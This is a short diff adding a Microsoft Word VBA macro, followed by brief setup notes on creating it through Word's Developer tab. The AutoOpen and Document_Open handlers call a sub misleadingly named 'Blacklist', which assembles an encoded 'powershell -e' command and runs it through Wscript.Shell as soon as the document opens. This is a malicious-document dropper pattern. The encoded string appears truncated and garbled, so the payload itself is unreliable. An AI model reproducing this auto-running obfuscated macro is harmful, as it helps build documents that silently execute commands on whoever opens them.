@@ -1,0 +1,26 @@
+Sub AutoOpen()
+
+  Blacklist
+  
+End Sub
+
+Sub Document_Open()
+
+  Blacklist
+  
+End Sub
+
+Sub Blacklist()
+
+    Dim Str As String
+  
+    Str = Str + "powershell -e JABjAGwAaQBlAAGUAdwAt"
+    Str = Str + "AE8AYgBqAGUAYwAdAAuAF343ddSDFVCEGFF"
+
+  
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+
+*Key Things*
+- Enable Developer Options > Inside Word & Visit Developer Tab > Select Macro
+- Make sure to create a New Macro, For Example in this case its named Blacklist
